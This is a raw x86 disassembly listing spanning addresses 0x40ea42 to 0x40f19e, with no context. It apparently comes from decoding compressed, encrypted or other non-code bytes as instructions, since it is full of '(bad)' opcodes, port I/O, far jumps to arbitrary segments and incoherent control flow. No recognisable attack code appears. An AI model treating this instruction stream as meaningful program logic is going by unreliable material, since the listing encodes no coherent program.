  40ea42:	hlt    
  40ea43:	adc    BYTE PTR [ecx],al
  40ea45:	outs   dx,BYTE PTR ds:[esi]
  40ea46:	sub    cl,BYTE PTR [edx+eiz*2-0x72]
  40ea4a:	sbb    al,0x59
  40ea4c:	cs imul esp,ebx,0xe64814b7
  40ea53:	add    al,0x7a
  40ea55:	cmp    eax,0x86cad77c
  40ea5a:	stc    
  40ea5b:	or     DWORD PTR ds:0x43b4983d,ebx
  40ea61:	or     DWORD PTR [esi-0x749874c],ebp
  40ea67:	adc    edi,DWORD PTR [edi+0x25]
  40ea6a:	jnp    0x40ea07
  40ea6c:	stos   DWORD PTR es:[edi],eax
  40ea6d:	repnz test eax,0xd22ff620
  40ea73:	outs   dx,BYTE PTR ds:[esi]
  40ea74:	xchg   ebp,eax
  40ea75:	add    DWORD PTR [edx],esp
  40ea77:	and    BYTE PTR [ecx],dh
  40ea79:	xchg   esp,eax
  40ea7a:	xchg   BYTE PTR [ebx],bh
  40ea7c:	cmc    
  40ea7d:	repnz and BYTE PTR [edx-0x3b03ab38],bh
  40ea84:	and    BYTE PTR [esi-0x18],0xb2
  40ea88:	sub    eax,0x8d72336e
  40ea8d:	in     eax,dx
  40ea8e:	jbe    0x40eaa2
  40ea90:	mov    eax,0xfe21a4b4
  40ea95:	pop    ds
  40ea96:	cmp    DWORD PTR [eax+ecx*4+0x1],ebp
  40ea9a:	inc    BYTE PTR [ebx+0x39]
  40ea9d:	mov    esp,gs
  40ea9f:	sub    DWORD PTR [ecx+0x2fab894],0x2352628b
  40eaa9:	mov    al,0xe1
  40eaab:	lods   eax,DWORD PTR ds:[esi]
  40eaac:	daa    
  40eaad:	ja     0x40eb1f
  40eaaf:	add    BYTE PTR [edi],0xfa
  40eab2:	pop    ebp
  40eab3:	lea    esi,[esi+0x9]
  40eab6:	or     ch,dl
  40eab8:	retf   0xac8f
  40eabb:	mov    al,0xe3
  40eabd:	outs   dx,BYTE PTR ds:[esi]
  40eabe:	adc    ch,BYTE PTR [ebx]
  40eac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eac2:	mov    bl,0xf2
  40eac4:	pop    ebx
  40eac5:	sub    ch,BYTE PTR [ebx-0x61e7ffc5]
  40eacb:	or     eax,0xeb44970
  40ead0:	cdq    
  40ead1:	mov    ebx,esi
  40ead3:	sub    al,0x23
  40ead5:	inc    ecx
  40ead6:	push   ebx
  40ead7:	out    0xa,al
  40ead9:	loopne 0x40eb33
  40eadb:	add    DWORD PTR [esi-0x6dd40ca7],esp
  40eae1:	dec    ebp
  40eae2:	(bad)  
  40eae3:	stos   BYTE PTR es:[edi],al
  40eae4:	les    eax,FWORD PTR [eax-0x6a]
  40eae7:	jecxz  0x40eade
  40eae9:	push   ds
  40eaea:	xlat   BYTE PTR ds:[ebx]
  40eaeb:	retf   
  40eaec:	in     al,0x3f
  40eaee:	inc    edx
  40eaef:	jo     0x40ea96
  40eaf1:	xchg   esp,eax
  40eaf2:	push   ds
  40eaf3:	pop    ebp
  40eaf4:	rol    BYTE PTR [ebp+0x78],cl
  40eaf7:	xor    eax,0x805968db
  40eafc:	or     dl,BYTE PTR [edx]
  40eafe:	les    esi,FWORD PTR [ecx+0x5e]
  40eb01:	adc    eax,0xd6a874ff
  40eb06:	mov    dh,0x40
  40eb08:	loope  0x40ea8e
  40eb0a:	sahf   
  40eb0b:	pop    edi
  40eb0c:	pop    ecx
  40eb0d:	xchg   esp,eax
  40eb0e:	dec    esi
  40eb0f:	pushf  
  40eb10:	(bad)  
  40eb11:	leave  
  40eb12:	push   0xfffffff9
  40eb14:	sahf   
  40eb15:	jae    0x40eae9
  40eb17:	jle    0x40eaab
  40eb19:	jb     0x40eaf7
  40eb1b:	xchg   BYTE PTR [eax],bh
  40eb1d:	sbb    al,0x2c
  40eb1f:	inc    ecx
  40eb20:	cmp    BYTE PTR [ebp-0x55],dh
  40eb23:	cmp    BYTE PTR [esi-0x71],bl
  40eb26:	into   
  40eb27:	scas   al,BYTE PTR es:[edi]
  40eb28:	push   eax
  40eb29:	pop    esi
  40eb2a:	stos   DWORD PTR es:[edi],eax
  40eb2b:	fbstp  TBYTE PTR [ebp-0x7de1213d]
  40eb31:	push   edi
  40eb32:	in     al,dx
  40eb33:	xor    BYTE PTR [ecx+eiz*8],0x58
  40eb37:	push   eax
  40eb38:	in     al,dx
  40eb39:	mov    bh,0xb6
  40eb3b:	call   0xfa7a:0x516422f
  40eb42:	cmp    DWORD PTR [edx],eax
  40eb44:	(bad)  
  40eb45:	out    dx,al
  40eb46:	pop    edi
  40eb47:	sbb    BYTE PTR [edi],dl
  40eb49:	int    0x12
  40eb4b:	cli    
  40eb4c:	pop    edx
  40eb4d:	inc    esp
  40eb4e:	adc    DWORD PTR ss:[ebx+0x6881fce0],0xe81b3a82
  40eb59:	xchg   edx,eax
  40eb5a:	popf   
  40eb5b:	sbb    eax,DWORD PTR [ecx-0x75]
  40eb5e:	or     DWORD PTR [eax],ecx
  40eb60:	xor    al,0xa8
  40eb62:	outs   dx,DWORD PTR ds:[esi]
  40eb63:	mov    al,0xda
  40eb65:	lahf   
  40eb66:	pop    es
  40eb67:	cdq    
  40eb68:	xchg   BYTE PTR [esi-0x53d26ba0],al
  40eb6e:	pop    ebp
  40eb6f:	mov    cs,WORD PTR [eax+0x21]
  40eb72:	mov    ch,0x8c
  40eb74:	fadd   QWORD PTR [ebp+0x50bab36b]
  40eb7a:	imul   ecx,DWORD PTR [edx-0x5ecd645],0x61d1825b
  40eb84:	add    BYTE PTR [esp+ecx*4+0x71e978fc],ch
  40eb8b:	sub    al,cl
  40eb8d:	add    BYTE PTR [eax],0x26
  40eb90:	shl    dl,cl
  40eb92:	test   BYTE PTR [ebx-0x1dbb5568],bl
  40eb98:	and    BYTE PTR [ecx-0x70],0x41
  40eb9c:	shl    esp,cl
  40eb9e:	mov    esp,0x1d4d7dc
  40eba3:	push   ecx
  40eba4:	sub    eax,DWORD PTR [esi]
  40eba6:	les    esi,FWORD PTR [esi-0x28]
  40eba9:	adc    esi,DWORD PTR [eax-0x69]
  40ebac:	inc    esi
  40ebad:	sbb    eax,0x88d1069b
  40ebb2:	mov    bh,0xc7
  40ebb4:	and    al,0xf8
  40ebb6:	dec    ebx
  40ebb7:	into   
  40ebb8:	jmp    0x40eba5
  40ebba:	ret    0xc0f
  40ebbd:	cwde   
  40ebbe:	js     0x40eb9d
  40ebc0:	push   ds
  40ebc1:	loop   0x40eb69
  40ebc3:	(bad)  
  40ebc4:	mov    ebp,0x6d948abd
  40ebc9:	xchg   esp,eax
  40ebca:	and    ah,BYTE PTR [eax+0x50bceeed]
  40ebd0:	xchg   ebx,eax
  40ebd1:	mov    ch,BYTE PTR [edi+0x4e9f8bd9]
  40ebd7:	or     al,0xc7
  40ebd9:	lock or al,0x1b
  40ebdc:	mov    cl,0xe
  40ebde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebdf:	jb     0x40ec0d
  40ebe1:	push   edx
  40ebe2:	xor    eax,0x9a0ecc8f
  40ebe7:	adc    DWORD PTR [esi],esi
  40ebe9:	xchg   ebp,eax
  40ebea:	mov    edi,0xda04cfe
  40ebef:	pop    ecx
  40ebf0:	es fs or al,0xcc
  40ebf4:	pop    DWORD PTR [eax]
  40ebf6:	sets   BYTE PTR [edi]
  40ebf9:	cs test eax,0x58f81ede
  40ebff:	mov    ds:0xa961cbd0,eax
  40ec04:	pop    edi
  40ec05:	jmp    0xda13:0x98e422eb
  40ec0c:	pop    edi
  40ec0d:	pop    es
  40ec0e:	xchg   ebx,eax
  40ec0f:	cwde   
  40ec10:	cmp    al,BYTE PTR [edx]
  40ec12:	jbe    0x40ec7b
  40ec14:	mov    bl,cl
  40ec16:	adc    bh,0x9e
  40ec19:	fld    TBYTE PTR [ebx-0x75]
  40ec1c:	and    ebx,edx
  40ec1e:	(bad)  
  40ec1f:	and    esp,DWORD PTR [edi]
  40ec21:	aaa    
  40ec22:	(bad)  
  40ec23:	push   edx
  40ec24:	sbb    dh,BYTE PTR [edi]
  40ec26:	inc    ecx
  40ec27:	rol    BYTE PTR [edx+0x2431fb73],1
  40ec2d:	(bad)  
  40ec2e:	pushf  
  40ec2f:	adc    edi,DWORD PTR [ebp+0x73]
  40ec32:	add    al,0xe6
  40ec34:	shr    DWORD PTR [ebx+0x6c],1
  40ec37:	mov    edx,DWORD PTR [ecx+0x3311a451]
  40ec3d:	and    dh,BYTE PTR [bp+si]
  40ec40:	mov    bh,0x38
  40ec42:	sub    BYTE PTR [ebx+0x6aec9b88],al
  40ec48:	add    al,0x8f
  40ec4a:	repz inc eax
  40ec4c:	mov    edi,0xf3489cc8
  40ec51:	stos   DWORD PTR es:[edi],eax
  40ec52:	and    esi,eax
  40ec54:	jbe    0x40ebec
  40ec56:	inc    esi
  40ec57:	jp     0x40ec03
  40ec59:	call   0x13664214
  40ec5e:	xchg   ebp,eax
  40ec5f:	test   eax,0xe3ff5699
  40ec64:	das    
  40ec65:	popa   
  40ec66:	out    0xd8,eax
  40ec68:	pushf  
  40ec69:	mov    al,ds:0x4a740b2b
  40ec6e:	dec    BYTE PTR gs:[ecx+0x27561e9f]
  40ec75:	and    ah,cl
  40ec77:	xor    al,0x4d
  40ec79:	into   
  40ec7a:	mov    ebp,ebp
  40ec7c:	loope  0x40ec95
  40ec7e:	out    dx,al
  40ec7f:	mov    ch,0xa2
  40ec81:	ror    BYTE PTR [ebp+0x63],cl
  40ec84:	imul   ebx,DWORD PTR [ebp+0x3edb39f9],0x73
  40ec8b:	ja     0x40ed05
  40ec8d:	dec    ecx
  40ec8e:	jp     0x40ec90
  40ec90:	sub    ch,BYTE PTR [edi+0x5d867da7]
  40ec96:	stc    
  40ec97:	cmp    al,0xfc
  40ec99:	mov    eax,0xef7170a1
  40ec9e:	mov    cl,0xf5
  40eca0:	fld    TBYTE PTR [edx+0x33e64b24]
  40eca6:	js     0x40ec72
  40eca8:	push   esi
  40eca9:	retf   0xd1a
  40ecac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecad:	jmp    0x163:0x20cd1087
  40ecb4:	adc    eax,0x1d227732
  40ecb9:	jnp    0x40ecd1
  40ecbb:	mov    ecx,ebp
  40ecbd:	in     eax,0xc0
  40ecbf:	jnp    0x40ecae
  40ecc1:	in     eax,dx
  40ecc2:	test   DWORD PTR [edi-0x54bc4d43],esp
  40ecc8:	push   edx
  40ecc9:	sbb    edi,ecx
  40eccb:	jecxz  0x40ed0b
  40eccd:	adc    BYTE PTR [edx-0x2a],0xe3
  40ecd1:	daa    
  40ecd2:	mov    eax,0x80bf6118
  40ecd7:	xor    bl,BYTE PTR [edi-0x3b348a62]
  40ecdd:	xor    ebp,edx
  40ecdf:	lock cwde 
  40ece1:	push   es
  40ece2:	and    BYTE PTR [ebx],0xdf
  40ece5:	mov    ebp,0xefc18201
  40ecea:	push   edx
  40eceb:	popa   
  40ecec:	xor    DWORD PTR [edx+0x66dcd954],ecx
  40ecf2:	xchg   BYTE PTR [edx],bl
  40ecf4:	sub    ebp,ebp
  40ecf6:	sahf   
  40ecf7:	mov    eax,0xd0e52ff0
  40ecfc:	ins    BYTE PTR es:[edi],dx
  40ecfd:	adc    DWORD PTR [ecx-0x5a18e8a9],esi
  40ed03:	dec    esi
  40ed04:	or     BYTE PTR [esp+eax*1+0xc],dl
  40ed08:	popf   
  40ed09:	repz inc edx
  40ed0b:	dec    esi
  40ed0c:	popa   
  40ed0d:	sahf   
  40ed0e:	test   BYTE PTR [ebx+esi*4-0x44b7fb1f],dl
  40ed15:	(bad)  
  40ed16:	je     0x40ecf9
  40ed18:	pop    ecx
  40ed19:	int3   
  40ed1a:	test   DWORD PTR [esi+0x235ef8f6],0x315a7a56
  40ed24:	xor    eax,0x3ce7fb41
  40ed29:	jns    0x40ed28
  40ed2b:	popf   
  40ed2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed2d:	(bad)  
  40ed2e:	adc    al,0x57
  40ed30:	add    eax,0x8729da10
  40ed35:	or     ah,ch
  40ed37:	rcl    BYTE PTR [eax],0xdc
  40ed3a:	pop    ebp
  40ed3b:	bound  eax,QWORD PTR [edi+ebx*8-0x5b]
  40ed3f:	fwait
  40ed40:	mov    eax,ds:0x5e40e60d
  40ed45:	jnp    0x40ecd6
  40ed47:	test   eax,0xd76ac952
  40ed4c:	outs   dx,DWORD PTR ds:[esi]
  40ed4d:	mov    edx,0x97c7fe17
  40ed52:	and    cl,BYTE PTR [ebp-0x27]
  40ed55:	add    edx,DWORD PTR [edx-0x37f89868]
  40ed5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed5c:	sar    BYTE PTR [edi],1
  40ed5e:	dec    ebp
  40ed5f:	sbb    BYTE PTR [edi],al
  40ed61:	dec    esi
  40ed62:	ficomp DWORD PTR [eax-0x37cccae9]
  40ed68:	jne    0x40ed86
  40ed6a:	sub    al,0x7e
  40ed6c:	jg     0x40ed90
  40ed6e:	mov    bh,0x13
  40ed70:	lock push esi
  40ed72:	enter  0x1263,0xef
  40ed76:	call   0xa187:0x8bc98a4c
  40ed7d:	and    BYTE PTR [ebx-0x585a3c9a],bl
  40ed83:	fdiv   st,st(3)
  40ed85:	inc    esp
  40ed86:	aas    
  40ed87:	push   eax
  40ed88:	mov    ds:0x9294870c,al
  40ed8d:	push   esp
  40ed8e:	inc    esi
  40ed8f:	jecxz  0x40ed92
  40ed91:	mov    ds:0x593df0bd,al
  40ed96:	sahf   
  40ed97:	sbb    al,BYTE PTR [edx+edx*8-0x6e]
  40ed9b:	cmp    eax,0xde80ada5
  40eda0:	rcr    DWORD PTR [ebx-0x1f38a216],1
  40eda6:	rdpmc  
  40eda8:	dec    ebx
  40eda9:	(bad)  
  40edaa:	data16 cmp al,0x52
  40edad:	gs ret 0xfed4
  40edb1:	gs ins DWORD PTR es:[edi],dx
  40edb3:	pop    es
  40edb4:	shr    BYTE PTR [edi-0x7f0cf99b],1
  40edba:	scas   eax,DWORD PTR es:[edi]
  40edbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edbc:	mov    dl,0x19
  40edbe:	jecxz  0x40ed95
  40edc0:	pop    ss
  40edc1:	fisttp DWORD PTR [eax-0x4a820719]
  40edc7:	xchg   BYTE PTR [bp+di],bl
  40edca:	jns    0x40ed7d
  40edcc:	mov    ebx,0x8270f509
  40edd1:	(bad)  
  40edd3:	or     eax,0x591cfce4
  40edd8:	jmp    0x7fe6a0e4
  40eddd:	and    DWORD PTR [ecx*8-0x75741832],ebx
  40ede4:	and    DWORD PTR [eax-0x2d],ebx
  40ede7:	stos   BYTE PTR es:[edi],al
  40ede8:	iret   
  40ede9:	test   BYTE PTR [edx],dh
  40edeb:	gs mov ecx,0xb6080a77
  40edf1:	sti    
  40edf2:	sub    DWORD PTR ds:0x9306297,ebp
  40edf8:	inc    edx
  40edf9:	sar    BYTE PTR [ebp+0x6d],1
  40edfc:	(bad)  
  40edfd:	push   edi
  40edfe:	dec    eax
  40edff:	repz push ecx
  40ee01:	(bad)  
  40ee02:	mov    BYTE PTR [edx-0x855f7d5],bh
  40ee08:	xchg   esp,eax
  40ee09:	adc    al,dl
  40ee0b:	cmp    BYTE PTR [esi],ah
  40ee0d:	je     0x40edac
  40ee0f:	mov    eax,0xcd62e0cc
  40ee14:	cmp    cl,BYTE PTR [esi+eiz*8]
  40ee17:	and    dl,BYTE PTR [ebp+0x2d]
  40ee1a:	xor    BYTE PTR [esi],al
  40ee1c:	dec    eax
  40ee1d:	or     dl,ah
  40ee1f:	pop    ecx
  40ee20:	jno    0x40ee6d
  40ee22:	dec    esi
  40ee23:	inc    eax
  40ee24:	adc    ecx,edx
  40ee26:	daa    
  40ee27:	add    DWORD PTR [ebx+eax*1+0x4d595cf9],esi
  40ee2e:	leave  
  40ee2f:	retf   
  40ee30:	dec    ecx
  40ee31:	dec    edx
  40ee32:	outs   dx,BYTE PTR ds:[esi]
  40ee33:	pop    ss
  40ee34:	xchg   ebp,eax
  40ee35:	or     ch,BYTE PTR [ecx+0x37604a2b]
  40ee3b:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40ee3d:	sbb    bl,cl
  40ee3f:	xor    DWORD PTR [esi-0x4310a3e5],esp
  40ee45:	xchg   edi,eax
  40ee46:	ja     0x40ee89
  40ee48:	(bad)  
  40ee4a:	jg     0x40ede9
  40ee4c:	out    0x7,eax
  40ee4e:	aaa    
  40ee4f:	repz push ebp
  40ee51:	aam    0x3b
  40ee53:	adc    eax,0xe73d7bbc
  40ee58:	jne    0x40ee18
  40ee5a:	mov    ds:0x81eeb5e2,al
  40ee5f:	icebp  
  40ee60:	fistp  DWORD PTR [edx]
  40ee62:	cmp    ecx,DWORD PTR [edi+0x7d]
  40ee65:	mov    al,ds:0x3253853e
  40ee6a:	jae    0x40ee46
  40ee6c:	imul   edi,DWORD PTR [eax-0x54],0x11f1a9c5
  40ee73:	mov    ch,0xbe
  40ee75:	retf   0x9b82
  40ee78:	push   ebp
  40ee79:	rcl    cl,1
  40ee7b:	pop    edi
  40ee7c:	mov    eax,0x6eda71aa
  40ee81:	adc    al,0x68
  40ee83:	gs (bad) 
  40ee85:	push   ss
  40ee86:	mov    dh,0xe0
  40ee88:	call   0x5ff9:0xc932591c
  40ee8f:	mov    dl,0x6a
  40ee91:	fimul  WORD PTR [eax]
  40ee93:	loope  0x40eeaa
  40ee95:	int3   
  40ee96:	xlat   BYTE PTR ds:[ebx]
  40ee97:	mov    esi,0x9cebfaf3
  40ee9c:	xor    eax,0x822cc4be
  40eea1:	xor    eax,0x554e101e
  40eea6:	mov    al,BYTE PTR [edi-0x2a]
  40eea9:	fwait
  40eeaa:	in     al,0x69
  40eeac:	or     eax,0xdf92f03f
  40eeb1:	enter  0xb421,0x39
  40eeb5:	call   0x2584:0xd54f1369
  40eebc:	popf   
  40eebd:	add    ah,BYTE PTR [esi]
  40eebf:	int    0x9e
  40eec1:	mov    ebx,cs
  40eec3:	lahf   
  40eec4:	cwde   
  40eec5:	xchg   ebp,eax
  40eec6:	mov    esp,cs
  40eec8:	mov    bh,0xce
  40eeca:	push   edi
  40eecb:	mov    ch,0x1e
  40eecd:	(bad)  
  40eece:	js     0x40eec7
  40eed0:	add    esp,0x1e
  40eed3:	sbb    bh,BYTE PTR [ebp+0x77d92fe1]
  40eed9:	aad    0x5
  40eedb:	pop    ss
  40eedc:	loope  0x40eebd
  40eede:	inc    edx
  40eedf:	outs   dx,BYTE PTR ds:[esi]
  40eee0:	dec    ebx
  40eee1:	test   al,0x44
  40eee3:	(bad)  
  40eee4:	jl     0x40eecb
  40eee6:	pop    esp
  40eee8:	mov    eax,0xbe163bba
  40eeed:	cwde   
  40eeee:	sbb    ch,BYTE PTR [edx]
  40eef0:	aad    0xc1
  40eef2:	xor    cl,bh
  40eef4:	inc    edx
  40eef5:	popa   
  40eef6:	or     eax,0x31b985ec
  40eefb:	cdq    
  40eefc:	pop    ebx
  40eefd:	push   ebx
  40eefe:	arpl   WORD PTR ds:0xf7307,si
  40ef04:	sub    edi,0xe958be28
  40ef0a:	ret    
  40ef0b:	xchg   ebx,eax
  40ef0c:	rcl    BYTE PTR [eax],0xce
  40ef0f:	(bad)  
  40ef10:	cmc    
  40ef11:	pop    ecx
  40ef12:	push   ecx
  40ef13:	mov    ebp,0xb3b44e0b
  40ef18:	cvtpi2ps xmm3,QWORD PTR [edx+0x1995adf3]
  40ef1f:	or     ah,dl
  40ef21:	(bad)  
  40ef22:	out    dx,al
  40ef23:	fdivr  DWORD PTR [ebx]
  40ef25:	dec    ecx
  40ef26:	ficomp WORD PTR [edi]
  40ef28:	mov    edi,0x29599b89
  40ef2d:	jecxz  0x40ef71
  40ef2f:	fbld   TBYTE PTR [edi+esi*1]
  40ef32:	sub    eax,0x4371d3c3
  40ef37:	mov    esp,DWORD PTR [edx+ebx*8-0x71]
  40ef3b:	add    dh,BYTE PTR [edx]
  40ef3d:	mov    ch,0x3e
  40ef3f:	mov    WORD PTR [eax-0x33e7b570],es
  40ef45:	fisttp DWORD PTR [ecx]
  40ef47:	dec    edi
  40ef48:	jo     0x40ef5d
  40ef4a:	cld    
  40ef4b:	and    ecx,DWORD PTR [edx+0xc51fe83]
  40ef51:	arpl   WORD PTR [ebx+0x787515f],ax
  40ef57:	int    0x5b
  40ef59:	stos   BYTE PTR es:[edi],al
  40ef5a:	cmp    eax,0xe73334e9
  40ef5f:	mov    bh,0x5e
  40ef61:	pusha  
  40ef62:	(bad)  
  40ef63:	rcl    DWORD PTR [edi],0x1a
  40ef66:	push   edx
  40ef67:	cld    
  40ef68:	div    BYTE PTR [ebp+0x56d3f63a]
  40ef6e:	inc    ebp
  40ef6f:	mov    WORD PTR [edx+0x6244f655],?
  40ef75:	sub    ecx,DWORD PTR [eax+0x5c1d3849]
  40ef7b:	push   0x50
  40ef7d:	jg     0x40efbe
  40ef7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef80:	add    eax,0x373578d4
  40ef85:	add    BYTE PTR [ebx+0x37],0xdc
  40ef89:	mov    al,ds:0xa5b56b03
  40ef8e:	aad    0xb3
  40ef90:	das    
  40ef91:	fst    DWORD PTR [eax+0x4b1dc8c4]
  40ef97:	jecxz  0x40efe5
  40ef99:	pop    esp
  40ef9a:	(bad)  
  40ef9b:	pop    ecx
  40ef9c:	xchg   esi,eax
  40ef9d:	xchg   ebp,eax
  40ef9e:	cmc    
  40ef9f:	cmp    esp,ebx
  40efa1:	cs jae 0x40ef8b
  40efa4:	push   0x623d702
  40efa9:	sbb    eax,0x38e9a08c
  40efae:	ss dec bp
  40efb1:	mov    ah,0xcb
  40efb3:	mov    bl,0x18
  40efb5:	test   al,0x1a
  40efb7:	mov    ah,0x65
  40efb9:	xor    al,0x0
  40efbb:	jns    0x40ef5d
  40efbd:	or     dl,BYTE PTR [ebx-0x62f35f4c]
  40efc3:	mov    ds:0xbb5dca75,eax
  40efc8:	shr    BYTE PTR [esi],cl
  40efca:	push   ss
  40efcb:	ret    
  40efcc:	adc    bl,bl
  40efce:	lods   al,BYTE PTR ds:[esi]
  40efcf:	inc    edi
  40efd0:	nop
  40efd1:	push   ds
  40efd2:	mov    WORD PTR [esi],cs
  40efd4:	xlat   BYTE PTR ds:[ebx]
  40efd5:	cdq    
  40efd6:	push   es
  40efd7:	ret    0xd5c0
  40efda:	sti    
  40efdb:	pop    edx
  40efdc:	es mov esp,0x5265dd0e
  40efe2:	mov    ah,0xd0
  40efe4:	sub    dh,BYTE PTR [ebx-0x3a2429e7]
  40efea:	mov    dh,ah
  40efec:	fimul  DWORD PTR [ecx]
  40efee:	or     eax,DWORD PTR fs:[ebx+0x30]
  40eff2:	mov    edi,0xbc924f78
  40eff7:	hlt    
  40eff8:	xchg   bh,ch
  40effa:	fiadd  WORD PTR [esi]
  40effc:	sbb    BYTE PTR [ecx-0x2b154979],cl
  40f002:	outs   dx,BYTE PTR ds:[esi]
  40f003:	mov    ds:0xa044a65b,al
  40f008:	jge    0x40f030
  40f00a:	xchg   DWORD PTR [edx*4-0x27829dca],ebp
  40f011:	out    dx,eax
  40f012:	daa    
  40f013:	out    dx,eax
  40f014:	aad    0xa
  40f016:	repz and eax,0xa0c8335b
  40f01c:	(bad)  
  40f01d:	xchg   esp,eax
  40f01e:	mov    ebx,0xd87167eb
  40f023:	pop    eax
  40f024:	sub    eax,0x4fcf7948
  40f029:	push   esp
  40f02a:	hlt    
  40f02b:	xchg   ebp,eax
  40f02c:	repz in eax,dx
  40f02e:	fst    DWORD PTR [edi+0x1e]
  40f031:	out    0x91,eax
  40f033:	sub    al,0x1b
  40f035:	dec    edx
  40f036:	and    eax,0x34e9eba5
  40f03b:	cli    
  40f03c:	push   edi
  40f03d:	mov    ds:0xbd69256,eax
  40f042:	fisttp QWORD PTR [esi-0x54fa2d7e]
  40f048:	xchg   ecx,eax
  40f049:	sub    al,0xce
  40f04b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f04c:	test   cl,ch
  40f04e:	and    ebp,DWORD PTR ds:0x53dc3b7f
  40f054:	int3   
  40f055:	jmp    0x6454a3a
  40f05a:	mov    DWORD PTR [edx+0x50],eax
  40f05d:	sbb    cl,ch
  40f05f:	sar    BYTE PTR [esi-0x48],1
  40f062:	js     0x40f017
  40f064:	jnp    0x40f006
  40f066:	sub    al,0xff
  40f068:	jg     0x40f0a0
  40f06a:	adc    DWORD PTR [eax+0x385f94a5],0x16
  40f071:	ds icebp 
  40f073:	pop    ecx
  40f074:	clc    
  40f075:	mov    ?,WORD PTR [edi]
  40f077:	loop   0x40f0d1
  40f079:	mov    cl,0x69
  40f07b:	dec    eax
  40f07c:	inc    eax
  40f07d:	jg     0x40f06b
  40f07f:	sbb    al,BYTE PTR [esi+ebx*4]
  40f082:	jb     0x40f103
  40f084:	mov    edi,0xeeeabeb5
  40f089:	stos   BYTE PTR es:[edi],al
  40f08a:	pop    ecx
  40f08b:	adc    BYTE PTR [esi-0xd],cl
  40f08e:	icebp  
  40f08f:	arpl   WORD PTR [edi+0x7b783aa],di
  40f095:	mov    dh,0x79
  40f097:	adc    al,BYTE PTR [edx+0x5ac3fc46]
  40f09d:	shl    BYTE PTR [edx],0xfc
  40f0a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0a1:	inc    eax
  40f0a2:	jbe    0x40f049
  40f0a4:	repnz sub DWORD PTR gs:[esi-0x65],ecx
  40f0a9:	pop    edi
  40f0aa:	test   BYTE PTR [esi+eiz*2-0x2e],bh
  40f0ae:	aaa    
  40f0af:	add    eax,DWORD PTR es:[edx+edx*4-0x7d]
  40f0b4:	adc    al,BYTE PTR [ecx+0x8]
  40f0b7:	dec    ebx
  40f0b8:	and    eax,0xc734f3cb
  40f0bd:	ja     0x40f093
  40f0bf:	ins    DWORD PTR es:[edi],dx
  40f0c0:	and    ecx,DWORD PTR [edx]
  40f0c2:	push   ss
  40f0c3:	and    dl,ch
  40f0c5:	jmp    0x78d56d6f
  40f0ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0cb:	push   es
  40f0cc:	or     al,0xe9
  40f0ce:	mov    edx,0xed63bf81
  40f0d3:	out    0xec,eax
  40f0d5:	(bad)  
  40f0d6:	repz mov eax,ds:0xd620b91
  40f0dc:	pusha  
  40f0dd:	int    0x75
  40f0df:	xchg   DWORD PTR [ebp-0x33],esi
  40f0e2:	out    dx,al
  40f0e3:	fistp  QWORD PTR [ebp+0x42efb49b]
  40f0e9:	int    0xc8
  40f0eb:	shl    BYTE PTR [ebp+0x39a0fd8d],cl
  40f0f1:	dec    ebx
  40f0f2:	push   esi
  40f0f3:	retf   
  40f0f4:	inc    esp
  40f0f5:	loopne 0x40f11c
  40f0f7:	(bad)  
  40f0f8:	xsha1  (bad)
  40f0f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0fa:	or     BYTE PTR [esi+ebp*8+0x72b73ab0],ch
  40f101:	sub    bl,ah
  40f103:	xchg   ecx,eax
  40f104:	jp     0x40f0d9
  40f106:	loop   0x40f102
  40f108:	xor    eax,DWORD PTR [edx]
  40f10a:	mov    eax,ds:0x96e5a8dd
  40f10f:	jmp    0x8a6a4522
  40f114:	dec    esp
  40f115:	aas    
  40f116:	and    esp,0x689bc760
  40f11c:	ds jnp 0x40f0fe
  40f11f:	push   ds
  40f120:	add    al,0x5a
  40f122:	repz jno 0x40f0a7
  40f125:	mov    bl,0x17
  40f127:	or     ebp,DWORD PTR [edi+0x77]
  40f12a:	nop
  40f12b:	mov    ah,0xb1
  40f12d:	jmp    0x40f0cb
  40f12f:	add    eax,0x75032bdf
  40f134:	iret   
  40f135:	in     eax,dx
  40f136:	jae    0x40f1b3
  40f138:	fnstenv [eax+ebp*8]
  40f13b:	sbb    BYTE PTR [esi-0xddbdec0],dl
  40f141:	xor    al,0xa8
  40f143:	mov    al,ds:0xc8375191
  40f148:	outs   dx,BYTE PTR ds:[esi]
  40f149:	pop    es
  40f14a:	les    esi,FWORD PTR [edi-0x5f]
  40f14d:	imul   esi,edi,0x21
  40f150:	push   eax
  40f151:	hlt    
  40f152:	int3   
  40f153:	pxor   mm4,mm7
  40f156:	pop    edi
  40f157:	xchg   ebx,eax
  40f158:	bound  eax,QWORD PTR [ebp-0x16]
  40f15b:	fs pop edx
  40f15d:	cdq    
  40f15e:	stos   DWORD PTR es:[edi],eax
  40f15f:	icebp  
  40f160:	daa    
  40f161:	adc    ecx,edi
  40f163:	test   DWORD PTR [edx+esi*1+0x504a4244],ecx
  40f16a:	sar    BYTE PTR [esi],0x7
  40f16d:	and    BYTE PTR [esi-0x3a],dh
  40f170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f171:	sub    DWORD PTR [ebx+0x12],0x36
  40f175:	mov    esi,edx
  40f177:	imul   edx,esp,0xffffffd9
  40f17a:	in     eax,0xf4
  40f17c:	stos   DWORD PTR es:[edi],eax
  40f17d:	lods   eax,DWORD PTR ds:[esi]
  40f17e:	mov    dl,0x2e
  40f180:	in     al,0x79
  40f182:	fsubr  QWORD PTR [ebp-0x520f0339]
  40f188:	idiv   dh
  40f18a:	sub    BYTE PTR [ebx],al
  40f18c:	jns    0x40f1ed
  40f18e:	in     eax,dx
  40f18f:	mov    bl,0x92
  40f191:	je     0x40f190
  40f193:	dec    edx
  40f194:	ficom  DWORD PTR ds:0x5cbd1ea5
  40f19a:	jno    0x40f16c
  40f19c:	xchg   edi,eax
  40f19d:	xchg   edx,eax
  40f19e:	push   0x4e
